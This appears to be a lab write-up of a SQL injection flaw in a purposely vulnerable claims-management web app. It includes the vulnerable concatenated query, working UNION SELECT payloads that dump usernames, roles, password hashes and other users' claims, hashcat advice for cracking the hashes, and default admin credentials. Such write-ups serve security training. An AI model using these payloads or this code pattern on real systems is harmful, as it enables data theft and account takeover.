# Privilege Escalation 2 — SQL Injection

**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralisation of Special Elements used in an SQL Command ('SQL Injection')

---

## Vulnerability Summary

The claims search function (`/search-claims`) concatenates user input directly into a raw SQL query without parameterisation or sanitisation. An authenticated normal staff user can inject SQL to extract data from other tables — including other users' claims or user credentials from the `users` table.

### Vulnerable Code

**`app.py` — `/search-claims` route (staff user path):**
```python
# User input directly concatenated into the SQL string
raw_query = "SELECT * FROM claims WHERE user_id = " + str(current_user.id) \
            + " AND title LIKE '%" + search_query \
            + "%' ORDER BY created_at DESC"
```

The resulting SQL query looks like this:

```sql
SELECT * FROM claims WHERE user_id = 1 AND title LIKE '%<INPUT>%' ORDER BY created_at DESC
```

Because `<INPUT>` is inserted directly into the SQL string, an attacker can break out of the `LIKE` string and inject arbitrary SQL.

---

## Database Schema Reference

**`claims` table — 12 columns:**

| # | Column             | Type     |
|---|--------------------|----------|
| 1 | `id`               | Integer  |
| 2 | `user_id`          | Integer  |
| 3 | `claim_type_id`    | Integer  |
| 4 | `title`            | String   |
| 5 | `description`      | Text     |
| 6 | `amount`           | Float    |
| 7 | `status`           | String   |
| 8 | `additional_details` | Text   |
| 9 | `created_at`       | DateTime |
|10 | `updated_at`       | DateTime |
|11 | `reviewed_by`      | Integer  |
|12 | `review_notes`     | Text     |

**`users` table — 6 columns:**

| # | Column          | Type     |
|---|-----------------|----------|
| 1 | `id`            | Integer  |
| 2 | `username`      | String   |
| 3 | `email`         | String   |
| 4 | `password_hash` | String   |
| 5 | `role`          | String   |
| 6 | `created_at`    | DateTime |

---

## Exploitation Steps

### Step 1 — Log in as a normal staff user

```
Username: staff_user
Password: staff_pass
```

### Step 2 — Navigate to the search page

Go to **Search Claims** (`/search-claims`).

### Step 3 — Determine the column count

The search input is inserted into the SQL query **once** (in the `title LIKE` clause). The `--` comment operator neutralises everything after it, so the `ORDER BY` clause is removed.

The raw SQL query looks like this:

```sql
SELECT * FROM claims WHERE user_id = <id> AND title LIKE '%INPUT%' ORDER BY created_at DESC
```

The injection point is inside the `LIKE '%…%'` pattern. To break out:
1. Close the `LIKE` string with `'`
2. Inject `UNION SELECT` with the correct number of columns (12)
3. End with `--` (including a **trailing space**) to comment out the remaining `%' ORDER BY created_at DESC`

Test with:

```
x' UNION SELECT 1::text,2::text,3::text,4::text,5::text,6::text,7::text,8::text,9::text,10::text,11::text,12::text -- 
```

> **Important:** Make sure to include a trailing space after `--`. PostgreSQL requires it for the comment to be valid.

> **Why `::text` casts?** The `UNION` requires compatible column types. Casting integers to `text` avoids type-mismatch errors with the `claims` table's text columns.

If the page loads without a "Query error" flash message, the column count is correct.

### Step 4 — Extract usernames and roles

Enter the following payload in the search box:

```
x' UNION SELECT id::text, username, email, username, role, NULL::text, role, created_at::text, NULL::text, NULL::text, NULL::text, NULL::text FROM users -- 
```

This maps user data to the columns the template renders:

| Template column        | Displays           | `users` value      |
|------------------------|--------------------|--------------------|
| ID (`row[0]`)          | User ID            | `id::text`         |
| Title (`row[3]`)       | **Username**       | `username`         |
| Amount (`row[5]`)      | (empty, avoids format error) | `NULL::text` |
| Status (`row[6]`)      | **Role**           | `role`             |
| Submitted (`row[7]`)   | **Created at**     | `created_at::text` |

Look for a row where the **Title** column shows `oic_admin` and the **Status** column shows `oic`.

### Step 5 — Extract password hashes (separate query)

The password hash cannot be placed in the Amount position (`row[5]`) because the non-raw template path tries to format it as a float (`"%.2f"|format(row[5])`). Use this separate payload to extract hashes:

```
x' UNION SELECT id::text, username, email, password_hash, created_at::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text FROM users -- 
```

This places `password_hash` in the **Title** column (`row[3]`), which renders as plain text.

> Note: The `password_hash` values are Werkzeug hashed passwords (e.g., `scrypt:32768:8:1$...`). Use an offline hash cracker (e.g., hashcat with mode 25600 for Werkzeug scrypt) to recover plaintext passwords.

### Step 6 — Extract all claims from other users

```
x' UNION SELECT id::text, user_id::text, claim_type_id::text, title, description, amount::text, status, additional_details, created_at::text, updated_at::text, reviewed_by::text, review_notes FROM claims WHERE user_id != 1 -- 
```

This returns claims belonging to all other users.

### Step 7 — Log in as the OIC user

Once the OIC password hash is cracked, log in at `/login` with the recovered credentials to gain full OIC privileges.

**Default OIC credentials (for reference):**
```
Username: oic_admin
Password: oic_admin_pass
```

---

## Root Cause

User-supplied search input is concatenated directly into a SQL string passed to `db.session.execute(db.text(raw_query))`. No parameterised queries or ORM filtering is used.
